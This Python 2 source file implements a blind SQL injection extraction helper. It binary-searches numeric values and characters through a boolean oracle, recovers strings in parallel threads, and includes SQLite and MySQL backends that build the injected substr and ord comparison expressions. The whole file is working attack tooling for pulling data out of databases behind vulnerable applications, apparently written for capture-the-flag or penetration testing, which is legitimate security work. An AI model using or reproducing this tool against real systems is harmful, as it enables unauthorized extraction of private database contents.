import sys
import random
import string
import threading
from collections import deque
import par

class Backend(object):
    def __init__(self, eval_bool):
        self.eval_bool = eval_bool

    def eval_num(self, expr, r=(0,100)):
        lo, hi = r
        while lo < hi:
            sys.stdout.write('\r[%d, %d]    ' % (lo, hi))
            sys.stdout.flush()
            mid = (lo+hi)/2
            if self.eval_bool("(%s)>%d" % (expr, mid)):
                lo = mid + 1
            else:
                hi = mid
        sys.stdout.write('\r= %d       ' % lo)
        print
        return lo

    def eval_chr(self, expr, i, char_range):
        lo, hi = char_range
        while lo < hi:
            mid = (lo+hi)/2
            if self.char_gt(expr, i, mid):  # expr[i] > mid
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)

    def eval_str(self, expr, len_range=(0,100), char_range=None, tries=10, n=10):
        if not char_range:
            char_range = self.__class__.char_range
        res = ""
        print "Finding length..."
        sz = self.eval_num("length((%s))" % expr, r=len_range)
        res = ["?"]*sz
        mx = threading.Lock()
        sys.stdout.write("".join(res))
        sys.stdout.flush()
        def task(i):
            for _ in range(tries):
                try:
                    c = self.eval_chr(expr, i, char_range)
                    with mx:
                        res[i] = c
                        sys.stdout.write('\r' + "".join(res))
                        sys.stdout.flush()
                        return
                except Exception, e:
                    pass
            raise e
        par.iter_parallel(task, range(sz), n=n)
        print
        return "".join(res)

    def eval_ascii(self, expr, **kwargs):
        # range might fail for our current sqlite implementation, not sure why
        return self.eval_str(expr, char_range=(32,126), **kwargs)

class Sqlite(Backend):
    def __init__(self, eval_bool):
        self.eval_bool = eval_bool
    char_range = (48,125)
    def char_gt(self, str_expr, i, c):
        return self.eval_bool("substr((%s),%d,1)>'%s'" % (str_expr, i+1, chr(c)))

class MySql(Backend):
    def __init__(self, eval_bool):
        self.eval_bool = eval_bool
    char_range = (0,255)
    def char_gt(self, str_expr, i, c):
        return self.eval_bool("ord(substr((%s),%d,1))>%d" % (str_expr, i+1, c))
    def encode_str(self, s):
        return '0x' + s.encode('hex')
